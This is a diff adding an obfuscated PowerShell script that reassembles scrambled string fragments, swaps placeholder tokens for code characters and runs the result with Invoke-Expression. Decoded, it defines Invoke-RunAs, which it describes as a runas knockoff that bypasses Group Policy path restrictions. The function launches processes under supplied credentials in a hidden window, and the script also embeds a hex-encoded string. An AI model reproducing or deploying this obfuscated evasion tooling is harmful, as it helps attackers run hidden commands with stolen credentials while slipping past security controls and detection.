@@ -1,0 +1,76 @@
+(("{24}{23}{11}{34}{38}{4}{35}{43}{16}{22}{18}{7}{41}{8}{10}{40}{25}{30}{27}{1}{2}{37}{42}{19}{31}{33}{29}{28}{5}{3}{14}{21}{15}{12}{26}{6}{32}{36}{13}{0}{39}{20}{17}{9}" -f '}
+            
+            [System.Diagnostics.Process]::Sta','( uHA27-69&70{3aN31k33-37-2eO31-31-2e{39>30-2e','O31;31O33{27uHA -SPliTuHA>uHA-SpLITuHA&uHA -spLit uHAkuHA-SPliTuHANuHA-SPlITuHA{uHA-s','  b9Cstartinfo.Arguments = b9CArguments
+  ','howWindow
+Show the window being created instead if hid',' }
+
+            if(b9CArguments) {
+              ','      b9Cstartinfo.Passw','     [Stri','Cdomain,
+    [Par',' h62[!] Error in runas: b9C_h62
+        }
+
+    }
+}
+
+','ameter(
+        ValueFromP',' restri','rname
+  ','    b9Cstartinfo.Domain = b9Cdomain
+            ','          }
+
+            if(b9CUserName) {
+                # if weuHA','               b9Cstartinfo.UserName = b9Cuse','ring]b9Cpa','    }
+        catch {
+           ','    ValueFromPipeline=b9CTrue)]
+   ',' [CHAr])}) )
+    PROCESS {
+  ',' C8P out-string
+    ','re using alternate credentials
+ ','ssword,
+    [Parameter(
+    ','CRIPTION
+Runas knockoff. Will bypass GPO path','function Invoke-RunAs {
+<#
+.DES','       [Switch]b9CShowWindow
+    )
+    b9CdcXEH=  [STRInG]::join(u','              b9Csec_password = convertto-securestring b9Cpassword -asplaintext -force
+          ','A ,','CTrue
+                b9Cstartinfo.WindowStyle = h62Hiddenh62
+           ','    b9Cstartinfo.UseShellExecute = b9Cfalse
+
+            if(-not (b9CShowWindow)) {
+                b9Cstartinfo.CreateNoWindow = b9','HAuH','      try{
+            b9Cstartin','ord = b9Csec_p','fo = new-object System.Diagnostics.ProcessStartInfo
+
+            b9Cstartinfo.FileName = b9Ccmd
+        ','ctions.
+
+.PARAMETER UserName
+Provide a user
+
+.PARAMETER Password
+Provide a password
+
+.PARAMETER Domain
+Provide optional domain
+
+.PARAMETER Cmd
+Command to execute.
+
+.PARAMET','ing it (th','assword
+            ','PLITuHA-uHA-SpLit uHAOuHA-spLItuHA;uHA C8P %{( [CoNvERt]::ToINT16( (b9C_.TosTriNg() ) ,16)-','ER S','rt(b9Cstartinfo)','ipeline=b9CTrue)]
+        [String]b9Ccmd,
+    [Parameter()]
+        [String]b9CArguments,
+    [Parameter()]
+ ','ng]b9','As','e default).
+
+.Example
+Invoke-RunAs -username administrator -password h62P@b9Cb9Cword!h62 -domain CORPA -Cmd notepad.exe
+#>
+    [CmdletBinding()]Param (
+    [Parameter(
+        ValueFromPipeline=b9CTrue)]
+        [String]b9Cusername,
+    [Parameter(
+        ValueFromPipeline=b9CTrue)]
+        [St')).rEPLaCE('uHA',[sTrIng][chaR]39).rEPLaCE(([chaR]98+[chaR]57+[chaR]67),'$').rEPLaCE(([chaR]104+[chaR]54+[chaR]50),[sTrIng][chaR]34).rEPLaCE('C8P',[sTrIng][chaR]124)|iEX
